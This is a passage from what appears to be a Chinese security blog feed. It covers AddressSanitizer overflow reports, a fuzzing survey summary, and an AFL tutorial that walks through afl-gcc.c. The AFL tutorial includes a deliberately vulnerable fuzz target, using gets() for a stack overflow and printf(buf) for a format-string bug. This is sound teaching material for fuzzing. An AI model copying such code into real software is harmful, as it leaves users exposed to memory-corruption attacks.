class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7000:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7010:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7020:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e7030:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASAN internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==2196928==ABORTING<br></code></pre></td></tr></table></figure><p>非常明确的指出了是<code>stack-buffer-overflow</code><br>栈中数组可访问的范围是<code>[48, 448)</code>,但程序访问了 452 处，故故障。</p><h2 id="全局缓冲区溢出"><a href="#全局缓冲区溢出" class="headerlink" title="全局缓冲区溢出"></a>全局缓冲区溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> global_array[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  global_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>报错如下</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs tap">=================================================================<br>==3701==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55633ad321b4 at pc 0x55633ad2f216 bp 0x7ffff739eca0 sp 0x7ffff739ec90<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x55633ad321b4 thread T0<br>    <span class="hljs-comment">#0 0x55633ad2f215 in main (/home/stre/Desktop/gl+0x1215)</span><br>    <span class="hljs-comment">#1 0x7f5a1ea1dfcf in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span><br>    <span class="hljs-comment">#2 0x7f5a1ea1e07c in __libc_start_main_impl ../csu/libc-start.c:409</span><br>    <span class="hljs-comment">#3 0x55633ad2f104 in _start (/home/stre/Desktop/gl+0x1104)</span><br><br>0x55633ad321b4 is located<span class="hljs-number"> 4 </span>bytes to the right of global variable &#x27;global_array&#x27; defined in &#x27;gl.c:4:5&#x27; (0x55633ad32020) of size 400<br>SUMMARY: AddressSanitizer: global-buffer-overflow (/home/stre/Desktop/gl+0x1215) in main<br>Shadow bytes around the buggy address:<br>  0x0aace759e3e0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e3f0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e400:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e410:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e420:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0aace759e430:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f9]f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e440: f9 f9 f9 f9 f9 f9 f9 f9<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e450:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e460:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e470:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0aace759e480:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>Shadow byte legend (one shadow byte represents<span class="hljs-number"> 8 </span>application bytes):<br>  Addressable:           00<br>  Partially addressable:<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 05 </span>06<span class="hljs-number"> 07 </span><br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after return:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3701==ABORTING<br></code></pre></td></tr></table></figure><p>与其他溢出报错并无太大差别。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing A Survey</title>
    <link href="/2023/03/02/Fuzzing-A-Survey/"/>
    <url>/2023/03/02/Fuzzing-A-Survey/</url>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing-a-survey"><a href="#Fuzzing-a-survey" class="headerlink" title="Fuzzing a survey"></a>Fuzzing a survey</h1><h2 id="1-Background"><a href="#1-Background" class="headerlink" title="1.Background"></a>1.Background</h2><ul><li>静态分析（Static analysis)：静态分析针对代码中的词汇、语义等漏洞，但缺乏正确率，即分析静态分析软件给出的信息，也需要话很多时间（高误报率）；</li><li>动态分析（Dynamic analysis)：动态分析针对运行中的程序，但效率低下，需要很大程度的人类参与，且对分析员要求很高；</li><li>符号执行（Symbolic execution)：符号执行对于大规模项目十分效率低下；</li><li>Fuzzing：可应对大规模程序，缺点是低效率与低代码覆盖率。</li></ul><h2 id="2-Fuzzing"><a href="#2-Fuzzing" class="headerlink" title="2.Fuzzing"></a>2.Fuzzing</h2><ul><li>输入文件越破碎越好，这样运行的程序更可能被打败；</li><li>输入可以是多种形式的：网络数据，各种格式的文件，可执行二进制数据等；</li></ul><p><strong>Fuzzing的执行</strong><br>Fuzzing过程中，会对发生的，感兴趣的exception，crashes，violations进行记录。随后可用各种二进制分析软件进行对crashes的分析，如<code> IDA Pro</code>,<code>GDB</code>等等。</p><ul><li>两种Fuzzer<ul><li>基于生成的fuzzer：更熟悉文件格式，能精准生成代码，更容易突破文件验证，测试更深层次的代码，当文件不友好时，分析文件格式很困难。</li><li>基于异变的fuzzer： 更简单地开始测试，需要一串有效的初始输入。</li></ul></li></ul><ul><li><p>基于依赖源码等级分类</p><ul><li>white box:需要源码，文件内的信息进行fuzz；</li><li>gray box:无需源码，通过运行分析程序获取部分内部信息；</li><li>black box:无需源码，不需要任何程序内部信息。</li></ul></li><li><p>dumb fuzzer 和 smart fuzzer：</p><ul><li>前者更注重速度，不回收信息；</li><li>后者会回收信息，优化异变策略，优化输入 。</li></ul></li></ul><p>Fuzzing目前遇到的挑战：</p><ul><li><p>The challenge of  <strong>how to mutate</strong>  seed inputs. </p><ul><li>如何变异/生成样例使其能涵盖更多路径、更容易触发bug；</li><li>何处变异，如何变异是重点；</li><li>即盲目异变是浪费时间，精准的变异策略才是解决问题的关键。</li></ul></li><li><p>The challenge of low <strong>code coverage</strong>.</p><ul><li>更高的覆盖率意味着更高的发现bug概率；</li><li>利用程序分析，达到更高的覆盖率。</li></ul></li><li><p>The challenge of <strong>passing the validation</strong>.</p><ul><li>许多程序都有输入检测，不符合规范则不予执行；</li><li>灰盒与黑盒程序对内部认证方式不清楚，很难绕过检测，于是效率低下。</li></ul></li></ul><h2 id="3-Coverage-based-Fuzzing"><a href="#3-Coverage-based-Fuzzing" class="headerlink" title="3.Coverage-based Fuzzing"></a>3.Coverage-based Fuzzing</h2><p><strong>Code coverage counting</strong></p><ul><li><p>最先进的方法把基本块（basic blocks）作为粒度</p><ul><li>基本块是程序执行时最小的相关单元；</li><li>测量函数或者指令会导致信息缺失或冗余；</li><li>BB可以用首地址辨认，且BB的信息可以轻松通过代码检测提取。</li></ul></li><li><p>两种测量选择： </p><ul><li> 仅计算运行的 BB 数量；</li><li> 以及计算 BB 间转换次数；</li></ul></li><li><p>前者测量顶点（vertices），后者测量边（edge）；  </p></li></ul><p><strong>以AFL为例，介绍边（edge）测量</strong></p><ul><li>有源码时：在编译生成二进制文件时，插入桩，为检测做准备；</li><li>无源码时：将基本块转换为 TCG 块时插桩。</li></ul><p>列举一段插桩代码</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs c">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;<br>shared_mem [ cur_location ^ prec_location]++;<br>prev_location = cur_location &gt;&gt; <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>cur_location 是随机生成的 ID ，而 shared_mem 是一块 64KB 的共享内存，每一个字节都标识着一个独特的边。<br>当一个 BB 间跳转发生时，会计算一个哈希值，然后当前哈希值对应的 bitmap 中的数据会被更新。如下图</p><p><strong>Working process of coverage-based fuzzing</strong><br>主循环内，程序挑选 interesting 种子进行变异、程序生成。目标程序执行这些生成的 testcases，发生 crash 的目标程序会被收集下来，其他感兴趣的样例会被放入种子池。<br>在 <strong>覆盖率引导</strong> 的 fuzzing 内，触发了新路径的程序，会被认为是 <strong>interesting</strong></p><p>Fuzzing 过程中，我们主要关注 覆盖率 和 程序违规 。<br>前者可由之前插桩代码来统计；<br>后者可在 sanitizer 的帮助下，进行分析。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">什么是<span class="hljs-variable">Sanitizer</span>？<br><span class="hljs-variable">Sanitizer</span>是由 <span class="hljs-variable">Google</span> 研发团队提出的用于检测 <span class="hljs-built_in">C</span><span class="hljs-operator">/</span><span class="hljs-built_in">C</span><span class="hljs-operator">++</span> 程序常见内存错误的工具集<br>其中包含：<br><span class="hljs-variable">AddressSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">asan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测内存访问错误，即发现程序访问了不该访问的内存，就会记录错误；<br><span class="hljs-variable">LeakageSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">lsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>内存泄露检测；<br><span class="hljs-variable">MemorySanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">msan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检查读取未初始化的内存错误；<br><span class="hljs-variable">ThreadSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">tsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测数据竞争与死锁；<br><span class="hljs-variable">UndefinedBehaviorSanitizer</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">ubsan</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">:</span>检测未定义的操作。<br></code></pre></td></tr></table></figure><p><strong>Key questions</strong></p><ul><li>How to get initial inputs ?<ul><li>提供格式良好的 inputs ；</li><li>良好的 inputs 可以适应许多格式复杂的文件 ；</li><li>能探入更深层次路径的 inputs ；</li><li>可复用</li></ul></li><li>How to generate testcases ?</li><li>How to select seed from the pool ?<ul><li>covering more code and be more likely to trigger vulnerabilities;</li><li>reduce the waste of repeatedly execution of paths and save computing resource</li></ul></li><li>How to efficiently test applications?<ul><li>forkserver </li></ul></li></ul><h2 id="4-Techniques-integrated-in-fuzzing"><a href="#4-Techniques-integrated-in-fuzzing" class="headerlink" title="4.Techniques integrated in fuzzing"></a>4.Techniques integrated in fuzzing</h2><ul><li>污点分析;</li><li>利用AI生成、检测好的seed，使之符合格式;</li><li>Intel PT;</li></ul><h2 id="5-Fuzzing-towards-different-applications"><a href="#5-Fuzzing-towards-different-applications" class="headerlink" title="5.Fuzzing towards different applications"></a>5.Fuzzing towards different applications</h2><ul><li>File format fuzzing;<ul><li>Peach;</li><li>on web browsers;</li></ul></li><li>Kernel fuzzing;</li><li>Fuzzing of protocols;</li></ul><h2 id="6-New-trends-of-fuzzing"><a href="#6-New-trends-of-fuzzing" class="headerlink" title="6.New trends of fuzzing"></a>6.New trends of fuzzing</h2><ul><li>Smart fuzzing;</li><li>New techniques;<ul><li>machine learning;</li></ul></li><li>new system features and hardware features;</li></ul><h2 id="7-Conclusion"><a href="#7-Conclusion" class="headerlink" title="7.Conclusion"></a>7.Conclusion</h2><p>Fuzzing是目前最为有效且效率高的漏洞发掘方式，本文对比了Fuzzing与其他技术的差别，总结了Fuzzing中综合的技术，最后展望了能让Fuzzing更为高效的未来技术。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing</title>
    <link href="/2023/02/19/Fuzzing/"/>
    <url>/2023/02/19/Fuzzing/</url>
    
    <content type="html"><![CDATA[<h1 id="初探Fuzz"><a href="#初探Fuzz" class="headerlink" title="初探Fuzz"></a>初探Fuzz</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>官网下载<br><a href="https://lcamtuf.coredump.cx/afl/">https://lcamtuf.coredump.cx/afl/</a><br>然后安装<br><code>tar zxvf afl-2.52b.tgz</code><br><code>make</code><br><code>sudo make install</code><br>安装结束</p><h3 id="初步使用AFL"><a href="#初步使用AFL" class="headerlink" title="初步使用AFL"></a>初步使用AFL</h3><p>样例程序（靶）</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span> </span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(str);<br>    <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="hljs-number">66</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="hljs-number">6</span>)<br>    &#123;<br>        <span class="hljs-built_in">raise</span>(SIGSEGV);<br>        <span class="hljs-comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;it is good!\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">gets</span>(buf);<span class="hljs-comment">//存在栈溢出漏洞</span><br>    <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//存在格式化字符串漏洞</span><br>    <span class="hljs-built_in">vuln</span>(buf);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编译程序"><a href="#编译程序" class="headerlink" title="编译程序"></a>编译程序</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">afl-gcc -g -o afl_test afl_test.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h3 id="建立读入、输出文件夹"><a href="#建立读入、输出文件夹" class="headerlink" title="建立读入、输出文件夹"></a>建立读入、输出文件夹</h3><p>如fuzz_in,fuzz_out</p><h3 id="开始fuzz"><a href="#开始fuzz" class="headerlink" title="开始fuzz"></a>开始fuzz</h3><p><code>afl-fuzz -i fuzz_in -o fuzz_out ./afl_test</code><br>接下来会报错<br><code> Pipe at the beginning of &#39;core_pattern&#39;</code><br>进行设置<br><code>sudo su</code><br><code> echo core &gt;/proc/sys/kernel/core_pattern</code><br>再次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i fuzz_in -o fuzz_out ./afl_test<br></code></pre></td></tr></table></figure><p>即可进入AFL仪表盘</p><h3 id="AFL-仪表盘"><a href="#AFL-仪表盘" class="headerlink" title="AFL 仪表盘"></a>AFL 仪表盘</h3><p><img src="/2023/02/19/Fuzzing/afl_ui.png" alt="AFL仪表盘"></p><p>关注<br><code>stage progress </code><br>若exec speed 低于600，则速度太慢<br><code> unique crashes</code><br>发现的路径数</p><h3 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h3><p><code> Ctrl+C</code><br>结束运行<br>进入fuzz_out<br>输入<code>xxd id:.........</code><br>查看结果，并分析</p><h1 id="AFL源码分析"><a href="#AFL源码分析" class="headerlink" title="AFL源码分析"></a>AFL源码分析</h1><h2 id="afl-gcc-c"><a href="#afl-gcc-c" class="headerlink" title="afl-gcc.c"></a>afl-gcc.c</h2><p><strong>afl-gcc.c</strong>是封装（wrapper）了gcc的一个文件<br>afl-gcc会寻找、配置环境变量以及许多配置数据。<br><strong>变量：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8*  as_path;                <span class="hljs-comment">/* Path to the AFL &#x27;as&#x27; wrapper      */</span> as的路径，接下来的函数find_as就是为了确定这个参数<br><span class="hljs-type">static</span> u8** cc_params;              <span class="hljs-comment">/* Parameters passed to the real CC  */</span><br><span class="hljs-type">static</span> u32  cc_par_cnt = <span class="hljs-number">1</span>;         <span class="hljs-comment">/* Param count, including argv0      */</span><br><span class="hljs-type">static</span> u8   be_quiet,               <span class="hljs-comment">/* Quiet mode                        */</span><br>            clang_mode;             <span class="hljs-comment">/* Invoked as afl-clang*?            */</span><br>            <br></code></pre></td></tr></table></figure><p><strong>函数  find_as(u8* argv0):</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_as</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>); <span class="hljs-comment">//getenv()函数，直接寻找环境变量中有无目标值，有就以字符串+null形式返回，无则直接返回null</span><br>  u8 *slash, *tmp;<span class="hljs-comment">// slash 斜杠 “\”  </span><br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/as&quot;</span>, afl_path);<span class="hljs-comment">//将找到的路径与/as拼接，尝试找到目标程序</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123; <span class="hljs-comment">// access()函数会尝试运行目标程序，成功返回值为0，否则返回-1，本句意为若通过环境变量找到了as，就...</span><br>      as_path = afl_path;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//找到最后一次出现字符&#x27;/&#x27;的位置并返回之</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//若找到&#x27;/&#x27;</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<span class="hljs-comment">//argv0是int main(int argc, char**argv)的第一个参数</span><br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-as&quot;</span>, dir);<span class="hljs-comment">//拼接运行时给入的地址与as</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, X_OK)) &#123;<br>      as_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/as&quot;</span>, X_OK)) &#123;<br>    as_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);<span class="hljs-comment">//若找不到as，抛出错误</span><br> <br>&#125;<br></code></pre></td></tr></table></figure><p>即本函数是寻找assembler的过程，没找到就报错</p><p><strong>函数edit_params</strong></p><ul><li>该函数将arvg[0]中的最后’&#39;后的字符串赋给name，根据一系列判断，确定’afl-lang’ or ‘afl-lang++’ or 其他平台，如APPLE等。</li><li>即读取第一个参数，然后确定平台、方式</li><li>随后进入while循环，读取argv[1]开始的参数</li><li>若为’-B’，提示<code>&quot;-B is already set, overriding&quot;</code></li><li>若为’-integrated-as’，略过</li><li>等等</li></ul><p><strong>离开while循环后</strong><br>若为<code>clang_mode</code>，设置<code>cc_params[cc_par_cnt++] = &#39;-no-integranted-as&#39;;</code><br>如果存在环境变量 <code>AFL_HARDEN</code>，则设置<code>-fstack-protector-all</code>。且如果没有设置<code> fortify_set</code> ，追加<code>-D_FORTIFY_SOURCE=2</code></p><p>之后还要一系列参数设置<br>总而言之，该函数是为了将参数设置好，符合运行环境以及指令。</p><p><strong>main函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 